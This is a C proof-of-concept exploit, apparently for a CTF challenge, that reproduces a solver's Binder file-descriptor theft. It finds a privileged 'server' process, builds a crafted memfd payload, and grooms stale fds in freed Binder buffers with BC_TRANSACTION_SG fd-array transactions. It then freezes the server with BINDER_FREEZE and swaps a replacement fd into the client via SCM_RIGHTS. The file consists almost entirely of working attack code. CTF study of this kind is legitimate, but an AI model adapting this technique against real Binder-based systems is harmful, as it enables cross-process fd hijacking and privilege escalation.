/*
 * fd_theft_poc.c
 *
 * Stage-1 scaffold for reproducing the real solver's "steal /dev/mte_driver
 * fd from server via Binder" trick.
 *
 * This only implements the parts we are HIGH confidence about, taken almost
 * verbatim from decompiling the real solver's main() (see
 * solver_reverse_notes.md section 3.2):
 *
 *   1. find the "server" process (comm == "server", all uid/gid == 30000)
 *   2. spawn /bin/client and do the HELLO handshake over
 *      /tmp/mte-client.sock
 *   3. build the exact "MIKU container" memfd payload (byte-for-byte copy
 *      of what the real solver writes into "solver-source-replacement")
 *   4. open /dev/binder, mmap it, check BINDER_VERSION, send
 *      BC_ENTER_LOOPER
 *
 * It deliberately STOPS before the actual "stale fd" grooming / freeze /
 * swap -- that part (GMA1/GMA2 tags, BINDER_FREEZE timing, the SCM_RIGHTS
 * exchange that actually steals the fd) is not decompiled yet. See
 * solver_dev_plan.md Stage 4 for the plan to go get it.
 *
 * Goal of this file: confirm every printf below prints what you expect,
 * with gdb watching /dev/binder + the server process, BEFORE writing a
 * single line of the actual fd-swap logic. If stage 1-4 here don't behave
 * as expected, nothing built on top of it will work either.
 *
 * Build (static, aarch64):
 *   aarch64-linux-gnu-gcc -static -O0 -g -o fd_theft_poc fd_theft_poc.c
 * or, if you have a compiler inside the guest:
 *   gcc -static -O0 -g -o fd_theft_poc fd_theft_poc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <poll.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <ctype.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* ---- Binder ioctl / constants (from structs.h) ---- */
#define BINDER_WRITE_READ   0xC0306201u
#define BINDER_VERSION      0xC0046209u
#define BC_ENTER_LOOPER     0x0000630cu

struct binder_write_read {
    int64_t  write_size;
    int64_t  write_consumed;
    uint64_t write_buffer;
    int64_t  read_size;
    int64_t  read_consumed;
    uint64_t read_buffer;
};

struct binder_buffer_object {
    uint32_t type;
    uint32_t flags;
    uint64_t buffer;
    uint64_t length;
    uint64_t parent;
    uint64_t parent_offset;
};

/*
 * CTF kernel binder_fd_array_object layout.
 * NOTE: field order differs from standard Linux!
 *   Standard: type, pad, parent(8), parent_offset(8), num_fds(8)
 *   This kernel: type, pad, num_fds(8), parent(8), parent_offset(8)
 * Confirmed by frame analysis in binder_transaction_buffer_release (0x264714):
 *   [x29-0x20] = num_fds  (0x264960: ldur x2, [x29, #-0x20])
 *   [x29-0x18] = parent   (0x26493c: ldur x3, [x29, #-0x18])
 *   [x29-0x10] = parent_offset (0x264980: ldur x8, [x29, #-0x10])
 */
struct binder_fd_array_object {
    uint32_t type;           /* 0x66646185 = BINDER_TYPE_FDA */
    uint32_t pad;
    uint64_t num_fds;        /* byte 8:  number of fds to close/install */
    uint64_t parent;         /* byte 16: INDEX into offsets array of parent PTR */
    uint64_t parent_offset;  /* byte 24: byte offset in PTR buffer where fds start */
};

struct binder_transaction_data {
    union {
        uint32_t handle;
        uint64_t ptr;
    } target;
    uint64_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid; 
    uint32_t sender_euid;
    uint64_t data_size;
    uint64_t offsets_size;
    union {
        struct {
            uint64_t buffer;
            uint64_t offsets;
        } ptr;
        uint8_t buf[8];
    } data;
};

struct binder_transaction_data_sg {
    struct binder_transaction_data transaction_data;
    uint64_t buffers_size;
};

struct __attribute__((packed)) binder_write_data {
    uint32_t cmd;
    struct binder_transaction_data_sg txn_sg;
};

static int binder_write_read(int fd, const void *wbuf, int64_t wsize,
                              void *rbuf, int64_t rsize, int64_t *consumed)
{
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size   = wsize;
    bwr.write_buffer = (uint64_t)(uintptr_t)wbuf;
    bwr.read_size    = rsize;
    bwr.read_buffer  = (uint64_t)(uintptr_t)rbuf;

    int ret;
    do {
        ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    } while (ret < 0 && errno == EINTR);

    if (consumed) *consumed = bwr.read_consumed;
    return ret;
}

void die_msg(const char *msg) {
    fprintf(stderr, "solver: %s\n", msg);
    exit(1);
}

void die_errno(const char *what_failed) {
    fprintf(stderr, "solver: %s: %s\n", what_failed, strerror(errno));
    exit(1);
}

void write_all(int fd, const void *buf, size_t len, const char *err_label) {
    while (len != 0) {
        ssize_t n = write(fd, buf, len);
        if (n < 1) {
            if (n == -1 && errno == EINTR) continue;
            die_errno(err_label);
        }
        buf += n;
        len -= n;
    }
}

/* ---- Step 1: find "server" pid (comm == "server", uid/gid all == 30000) ---- */
static pid_t find_server_pid(void)
{
    DIR *d = opendir("/proc");
    if (!d) { perror("opendir(/proc)"); exit(1); }

    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (!isdigit((unsigned char)e->d_name[0])) continue;
        pid_t pid = (pid_t)atoi(e->d_name);

        char path[64], line[256], comm[32];
        int uid[4] = { -1, -1, -1, -1 };
        int gid[4] = { -1, -1, -1, -1 };
        int uid_ok = 0, gid_ok = 0;

        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        comm[0] = 0;
        if (!fgets(comm, sizeof(comm), f)) { fclose(f); continue; }
        fclose(f);
        comm[strcspn(comm, "\n")] = 0;
        if (strcmp(comm, "server") != 0) continue;

        snprintf(path, sizeof(path), "/proc/%d/status", pid);
        f = fopen(path, "r");
        if (!f) continue;
        while (fgets(line, sizeof(line), f)) {
            if (!strncmp(line, "Uid:", 4) &&
                sscanf(line + 4, "%d %d %d %d", &uid[0], &uid[1], &uid[2], &uid[3]) == 4)
                uid_ok = 1;
            if (!strncmp(line, "Gid:", 4) &&
                sscanf(line + 4, "%d %d %d %d", &gid[0], &gid[1], &gid[2], &gid[3]) == 4)
                gid_ok = 1;
        }
        fclose(f);

        if (uid_ok && gid_ok &&
            uid[0] == 30000 && uid[1] == 30000 && uid[2] == 30000 && uid[3] == 30000 &&
            gid[0] == 30000 && gid[1] == 30000 && gid[2] == 30000 && gid[3] == 30000) {
            closedir(d);
            return pid;
        }
    }
    closedir(d);
    fprintf(stderr, "[-] could not find a process named \"server\" with uid/gid==30000\n");
    exit(1);
}

/* ---- Step 2: spawn /bin/client, connect to its control socket, HELLO ---- */
static int spawn_client_and_connect(void)
{
    pid_t child = fork();
    if (child < 0) { perror("fork"); exit(1); }
    if (child == 0) {
        char *argv[] = { (char *)"/bin/client", NULL };
        char *envp[] = { (char *)"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        execve("/bin/client", argv, envp);
        _exit(127); /* only reached if execve fails */
    }

    int fd = -1;
    for (int i = 0; i < 200; i++) {
        fd = socket(AF_UNIX, SOCK_STREAM, 0);
        struct sockaddr_un addr;
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, "/tmp/mte-client.sock", sizeof(addr.sun_path) - 1);
        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0)
            break;
        close(fd);
        fd = -1;
        usleep(25000); /* 25ms, matches the real solver's retry interval */
    }
    if (fd < 0) {
        fprintf(stderr, "[-] connect(/tmp/mte-client.sock) failed after retries\n");
        exit(1);
    }

    if (write(fd, "HELLO\n", 6) != 6) { perror("write(HELLO)"); exit(1); }

    char reply[256];
    int n = 0;
    while (n < (int)sizeof(reply) - 1) {
        char c;
        ssize_t r = read(fd, &c, 1);
        if (r <= 0) { fprintf(stderr, "[-] client closed before HELLO ack\n"); exit(1); }
        reply[n++] = c;
        if (c == '\n') break;
    }
    reply[n] = 0;
    printf("[+] client hello reply: %s", reply);
    return fd;
}

/*
 * ---- Step 3: build the "MIKU container" memfd payload ----
 *
 * Byte-for-byte reconstruction of the block the real solver writes into
 * memfd_create("solver-source-replacement"), taken directly from the
 * decompiled main() (FUN_0102c3e8). We do not fully understand WHY every
 * field is what it is yet (see solver_reverse_notes.md / solver_dev_plan.md
 * for the current best guess: it looks like a BINDER_TYPE_PTR scatter-gather
 * buffer containing a BINDER_TYPE_FDA fd-array descriptor), but we know
 * EXACTLY what bytes the real solver puts here -- reproduce it exactly
 * before trying to modify it.
 */
static int build_miku_replacement_memfd(void)
{
    int fd = memfd_create("solver-source-replacement", MFD_CLOEXEC);
    if (fd < 0) { perror("memfd_create"); exit(1); }
    if (ftruncate(fd, 0x1000) < 0) { perror("ftruncate"); exit(1); }

    uint64_t *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) { perror("mmap(memfd)"); exit(1); }

    memset(p, 0, 0x1000);

    /* offsets are in 8-byte units (uint64_t index) -- these assignments
     * mirror puVar21[i] = ... in the decompiled main() exactly */
    p[4] = 0x100000038ULL;
    p[3] = 0x3000000000ULL;
    p[0] = 0x30000150414d4dULL;          /* "MMAP" + version/flags word */
    *(uint32_t *)(p + 5) = 0x400;
    p[2] = 0x534f4c5600000000ULL;        /* section tag #1 */
    p[1] = 1;
    p[9] = 0x534f4c5600000000ULL;        /* section tag #2 */
    p[8] = 1;
    p[6] = 0x0300013145544dULL;          /* "MTE1" + flag/cmd_type word */
    p[0xc] = 0x40000000001ULL;
    p[0xb] = 0x3800000030ULL;
    p[7]  = 0x100000038ULL;

    /* 32 repeated blocks starting at p + 0x43, each 4 * 8 = 32 bytes:
     *   "MIKU!KPQ", a per-block fill byte repeated 16x, "CKFOBETM" */
    uint64_t *q = p + 0x43;
    for (uint64_t i = 0; i < 0x20; i++) {
        q[-1] = 0x51504b21554b494dULL;   /* "MIKU!KPQ" */
        uint64_t fill = ((i + 0x41) & 0xff) * 0x0101010101010101ULL;
        q[-3] = fill;
        q[-2] = fill;
        q[0]  = 0x4d5445424f46434bULL;   /* "CKFOBETM" */
        q += 4;
    }

    msync(p, 0x1000, MS_SYNC);
    munmap(p, 0x1000);
    return fd;
}

/* ---- Step 4: open /dev/binder, mmap it, check version, enter looper ---- */
static int setup_binder(void)
{
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { perror("open(/dev/binder)"); exit(1); }

    void *map = mmap(NULL, 0x100000, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap(/dev/binder)"); exit(1); }

    uint32_t version = 0;
    if (ioctl(fd, BINDER_VERSION, &version) < 0) { perror("BINDER_VERSION"); exit(1); }
    printf("[+] binder version = %u\n", version);

    // uint32_t enter_looper = BC_ENTER_LOOPER;
    // if (binder_write_read(fd, &enter_looper, sizeof(enter_looper), NULL, 0, NULL) < 0) {
    //     perror("BC_ENTER_LOOPER");
    //     exit(1);
    // }
    // printf("[+] sent BC_ENTER_LOOPER\n");

    return fd;
}

/* ---- Step 5: stale fd grooming + BINDER_FREEZE ---- */
/*
 * Send one SETUP (async BC_TRANSACTION_SG with FDA) to the server.
 * Call twice back-to-back (no sleep between) so the server allocates two
 * separate binder buffers A and B, each 0x68 bytes total:
 *
 *   kernel buffer size = ALIGN(data_size,8) + ALIGN(offsets_size,8)
 *                      + ALIGN(buffers_size,8)
 *                      = 0x50 + 0x10 + 0x08 = 0x68
 *
 * binder_apply_fd_fixups (server context) writes the server's newly allocated
 * fd number into the kernel buffer at sg_buf_offset = 0x60.  The buffer is
 * then freed without zeroing (TF_CLEAR_BUF not set), so fd=4 persists in
 * slot A and fd=5 persists in slot B.
 *
 * Mechanism: kernel reads our sg_buf[4] (containing fd=0) via
 * binder_translate_fd_array → task_get_file(exploit_task, 0) captures the
 * file*.  On delivery, binder_apply_fd_fixups calls receive_fd(file*, 0) in
 * server context → allocates server fd=4 (SETUP1) or fd=5 (SETUP2) and
 * writes that number back to kernel_buffer[0x60].  Our sg_buf content does
 * not determine the stale value; it merely provides a valid file reference.
 *
 * Flags MUST be 0x01 (TF_ONE_WAY only).  Using 0x41 (TF_ONE_WAY|TF_UPDATE_TXN)
 * would cause SETUP2 to supersede SETUP1 before the server processes it,
 * destroying slot A's stale fd.
 */
static void send_setup(int binder_fd, const char *tag_str)
{
    /*
     * data_blob layout (0x50 = 80 bytes, matching client's data_size exactly):
     *   [0..7]   unused prefix (8 bytes)
     *   [8..47]  BINDER_TYPE_PTR (binder_buffer_object, 40 bytes)
     *              .buffer = sg_buf  (any valid 4-byte user-space addr; kernel
     *                                 reads 4 bytes from here for the fd value)
     *              .length = 4
     *   [48..79] BINDER_TYPE_FDA (binder_fd_array_object, 32 bytes)
     *              .num_fds = 1
     *              .parent  = 0   (offsets_array[0] = 8 → PTR object)
     *              .parent_offset = 0
     */
    uint8_t sg_buf[4] = {0};   /* fd value 0 (exploit's stdin); content irrelevant
                                 * to stale fd — only the server's allocated fd matters */
    uint8_t data_blob[80] = {0};   /* 0x50 bytes: must match client's data_size */

    struct binder_buffer_object *sg_obj = (struct binder_buffer_object *)(data_blob + 8);
    sg_obj->type   = 0x70742a85;                     /* BINDER_TYPE_PTR */
    sg_obj->buffer = (uint64_t)(uintptr_t)sg_buf;   /* valid 4-byte addr */
    sg_obj->length = 4;
    /* sg_obj->parent = 0, sg_obj->parent_offset = 0 (root buffer, already zeroed) */

    struct binder_fd_array_object *fda_obj = (struct binder_fd_array_object *)(data_blob + 48);
    fda_obj->type          = 0x66646185;   /* BINDER_TYPE_FDA */
    fda_obj->pad           = 0;
    fda_obj->num_fds       = 1;
    fda_obj->parent        = 0;            /* offsets_array[0] = 8 → PTR */
    fda_obj->parent_offset = 0;            /* fd value at byte 0 of PTR's sg buffer */

    uint64_t offsets_array[2] = {8, 48};   /* PTR at data[8], FDA at data[48] */

    struct binder_write_data write_buf = {
        .cmd = 0x40486311,   /* BC_TRANSACTION_SG */
        .txn_sg = {
            .transaction_data = {
                .code         = 0x44464d43,  /* same code as client COMMIT */
                .flags        = 0x01,        /* TF_ONE_WAY only; NO TF_UPDATE_TXN */
                .data_size    = 0x50,        /* 80 bytes; makes kernel buf = 0x68,
                                              * matching client COMMIT exactly */
                .offsets_size = 16,          /* 2 entries × 8 bytes */
                .data = {
                    .ptr = {
                        .buffer  = (uint64_t)(uintptr_t)data_blob,
                        .offsets = (uint64_t)(uintptr_t)offsets_array,
                    }
                }
            },
            .buffers_size = 8   /* one SG buffer: PTR->length=4, aligned to 8 */
        }
    };

    /* write-only: no read_size, no blocking wait for response */
    if (binder_write_read(binder_fd, &write_buf, sizeof(write_buf), NULL, 0, NULL) < 0)
        die_errno("BC_TRANSACTION_SG setup");
    printf("[+] setup sent, tag %s\n", tag_str);
}

static void binder_freeze(int binder_fd, int32_t pid, int32_t enable) {
    struct {
        int32_t pid;
        int32_t enable;
        int32_t timeout_ms;
    } req = {.pid = pid, .enable = enable, .timeout_ms = 0};
    int ret;
    do {
        ret = ioctl(binder_fd, 0x400c620e, &req);
    } while (ret < 0 && errno == EINTR);
    if (ret < 0) {
        perror("ioctl(BINDER_FREEZE)");
        exit(1);
    }
}

int main(void)
{
    /* Build-stamp: confirms which binary is running after recompile */
    printf("[BUILD] compiled %s %s\n", __DATE__, __TIME__);
    /*
     * The stale-fd trick targets client fd=5 (conn_fd: accepted unix socket,
     * dup2'd to slot 5 in function 0x10129ac).  The fd=5 stale value does NOT
     * come from us; it comes from the server's fd table (server has fds 0-3
     * before SETUP1, so SETUP1→fd=4 at slot A, SETUP2→fd=5 at slot B).
     * TX3 supersedes TX2 (which holds slot B) → binder_deferred_fd_close(5)
     * runs in the CLIENT's context → client's conn_fd is closed.
     */
    int udp_client = -1, udp_peer = -1, opt_val = 1;
    struct my_cmsg_buf {
        struct cmsghdr hdr;  /* on 64-bit Linux: size_t cmsg_len → sizeof = 16 */
        int fds[16];         /* fds at offset 16 = CMSG_DATA, no padding needed */
    } cmsg_buf;
    uint8_t groom_bytes[24] = {
        0x07,0x17,0x18,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
        0x30,0x75,0x00,0x00, 0x30,0x75,0x00,0x00, 0x00,0x00,0x00,0x00,
    };
    int retries = 16;
    char reply_buf[0x100], expect_buf[0x20];
    int spair[2];

    printf("[*] stage 1: locating server...\n");
    pid_t server_pid = find_server_pid();
    printf("[+] found server pid = %d\n", server_pid);

    printf("[*] stage 2: spawning /bin/client and saying HELLO...\n");
    int ctl_fd = spawn_client_and_connect();
    printf("[+] ctl_fd = %d\n", ctl_fd);

    udp_client = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (udp_client < 0) {
        perror("Failed to create udp_client socket");
        exit(1);
    }
    udp_peer = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (udp_peer < 0) {
        perror("Failed to create udp_peer socket");
        exit(1);
    }
    if (setsockopt(udp_client, IPPROTO_IP, IP_RECVTTL, &opt_val, sizeof(opt_val)) < 0) {
        perror("setsockopt(IP_RECVTTL)");
        exit(1);
    };
    if (setsockopt(udp_client, IPPROTO_IP, IP_RECVOPTS, &opt_val, sizeof(opt_val)) < 0) {
        perror("setsockopt(IP_RECVOPTS)");
        exit(1);
    }
    /* Real solver does not die on IP_TTL failure (no error check).
     * server_pid > 255 causes EINVAL on Linux; that's fine for Stage 6. */
    if (setsockopt(udp_peer, IPPROTO_IP, IP_TTL, &server_pid, sizeof(server_pid)) < 0)
        printf("[!] setsockopt(IP_TTL=%d): %s (non-fatal, EXEC phase may fail)\n",
               server_pid, strerror(errno));
    struct sockaddr_in client_bind_addr = {
        .sin_family = AF_INET,
        .sin_port = 0,
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };
    if (bind(udp_client, (struct sockaddr *)&client_bind_addr, sizeof(client_bind_addr)) < 0) {
        perror("Failed to bind udp_client");
        exit(1);
    }
    struct sockaddr_in peer_bind_addr = {
        .sin_family = AF_INET,
        .sin_port = 0,
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };
    if (bind(udp_peer, (struct sockaddr *)&peer_bind_addr, sizeof(peer_bind_addr)) < 0) {
        perror("Failed to bind udp_peer");
        exit(1);
    }
    struct sockaddr_in client_addr, peer_addr;
    socklen_t client_len = sizeof(client_addr);
    socklen_t peer_len = sizeof(peer_addr);

    if (getsockname(udp_client, (struct sockaddr *)&client_addr, &client_len) < 0) {
        perror("Failed to getsockname for udp_client");
        exit(1);
    }
    if (getsockname(udp_peer, (struct sockaddr *)&peer_addr, &peer_len) < 0) {
        perror("Failed to getsockname for udp_peer");
        exit(1);
    }
    if (connect(udp_client, (struct sockaddr *)&peer_addr, sizeof(peer_addr)) < 0) {
        perror("Failed to connect udp_client to peer_addr");
        exit(1);
    }
    if (connect(udp_peer, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        perror("Failed to connect udp_peer to client_addr");
        exit(1);
    }
    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, spair) < 0)
        die_errno("socketpair(return)");

    printf("[*] stage 3: building MIKU replacement memfd...\n");
    int replacement_fd = build_miku_replacement_memfd();
    printf("[+] replacement_fd = %d\n", replacement_fd);

    printf("[*] stage 4: setting up /dev/binder...\n");
    int binder_fd = setup_binder();
    printf("[+] binder_fd = %d\n", binder_fd);

    printf("[*] stage 5: stale fd grooming + BINDER_FREEZE\n");
    /* Send both SETUPs back-to-back (no sleep) so the server processes them
     * sequentially and allocates two DIFFERENT 0x68-byte slots A and B.
     * SETUP1 → server fd=4 stored at slot A[0x60] (stale after free).
     * SETUP2 → server fd=5 stored at slot B[0x60] (stale after free). */
    send_setup(binder_fd, "GM1A");
    send_setup(binder_fd, "GM2A");
    usleep(100000);
    binder_freeze(binder_fd, server_pid, 1);

    printf("[*] stage 6: send three COMMIT to server and send SCM_RIGHTS with replacement_fd\n");
    write_all(ctl_fd, "COMMIT\nCOMMIT\nCOMMIT\n", 21, "write(COMMIT)");
    sleep(1);
    cmsg_buf.fds[0] = udp_client;
    cmsg_buf.fds[1] = spair[1];
    cmsg_buf.fds[2] = replacement_fd;
    for (int i = 3; i < 16; i++) {
        cmsg_buf.fds[i] = open("/dev/null", O_CLOEXEC);
    }
    cmsg_buf.hdr.cmsg_len = CMSG_LEN(sizeof(int) * 16);
    cmsg_buf.hdr.cmsg_level = SOL_SOCKET;
    cmsg_buf.hdr.cmsg_type = SCM_RIGHTS;
    printf("[DBG] sizeof(cmsghdr)=%zu sizeof(cmsg_buf)=%zu cmsg_len=%u msg_controllen=%zu\n",
           sizeof(struct cmsghdr), sizeof(cmsg_buf),
           (unsigned)cmsg_buf.hdr.cmsg_len, sizeof(cmsg_buf));
    printf("[DBG] fds[0..2]: udp_client=%d spair[1]=%d replacement_fd=%d\n",
           cmsg_buf.fds[0], cmsg_buf.fds[1], cmsg_buf.fds[2]);
    {
        ssize_t r;
        do {
            r = sendmsg(ctl_fd, &(struct msghdr){
                .msg_iov = &(struct iovec){ .iov_base = "\n", .iov_len = 1 }, .msg_iovlen = 1,
                .msg_control = &cmsg_buf, .msg_controllen = sizeof(cmsg_buf),
            }, MSG_NOSIGNAL);
        } while (r < 0 && errno == EINTR);
        if (r < 0) die_errno("sendmsg(SCM_RIGHTS)");
        printf("[+] sendmsg(SCM_RIGHTS) OK, sent %zd byte(s)\n", r);
    }
    /* Real solver closes sv[1] and all /dev/null fds IMMEDIATELY after sendmsg,
     * with no sleep.  Extra delay here would desync from the kernel's fd-slot
     * allocation timing and break the stale-fd trick. */
    close(cmsg_buf.fds[1]);        /* close our copy of spair[1] */
    for (int i = 3; i < 16; i++)
        close(cmsg_buf.fds[i]);    /* close 13 /dev/null fds */
    if (setsockopt(udp_peer, IPPROTO_IP, IP_OPTIONS, groom_bytes, sizeof(groom_bytes)) < 0) {
        perror("setsockopt(IP_OPTIONS groom)");
        exit(1);
    }
    printf("[*] sending GROOM\\n to udp_peer (fd=%d), waiting reply...\n", udp_peer);
    write_all(udp_peer, "GROOM\n", 6, "write(udp groom)");

    /* Poll/recv loop mirrors real solver:
     *   - First attempt: 3000 ms timeout.
     *   - Subsequent 15 attempts: 500 ms each.
     *   - Expect reply prefix "0 " (client echoes "0 failed invalid\n" for
     *     unknown command "GROOM\n" via the stale-fd-replaced conn_fd).
     * DO NOT unfreeze server during this loop - that would corrupt Binder state. */
    while (true) {
        int timeout_ms = (retries == 16) ? 3000 : 500;
        struct pollfd pfd = { .fd = udp_peer, .events = 0x19, .revents = 0 };
        int r = poll(&pfd, 1, timeout_ms);
        printf("[DBG] poll(udp_peer) r=%d revents=0x%x retries=%d\n",
               r, pfd.revents, retries);
        if (r < 0 && errno == EINTR) continue;
        if (r <= 0) goto client_groom_fail;
        if (pfd.revents & POLLERR) {
            int sockerr = 0; socklen_t sl = sizeof(sockerr);
            getsockopt(udp_peer, SOL_SOCKET, SO_ERROR, &sockerr, &sl);
            printf("[-] POLLERR: SO_ERROR=%d (%s)\n", sockerr, strerror(sockerr));
            goto client_groom_fail;
        }

        ssize_t n = recv(udp_peer, reply_buf, 0xff, 0);
        if (n < 0) { printf("[-] recv(udp_peer): %s\n", strerror(errno)); goto client_groom_fail; }
        reply_buf[n] = 0;
        printf("[DBG] recv %zd bytes: '%s'\n", n, reply_buf);
        int expect_len = snprintf(expect_buf, 0x20, "%u ", 0);
        if (memcmp(reply_buf, expect_buf, expect_len) == 0) break;

        if (--retries == 0) {
client_groom_fail:
            binder_freeze(binder_fd, server_pid, 0);
            die_msg("client did not consume cmsg groom");
        }
    }
    printf("[+] client groom reply = %s\n", reply_buf);
    binder_freeze(binder_fd, server_pid, 0);
    return 0;
}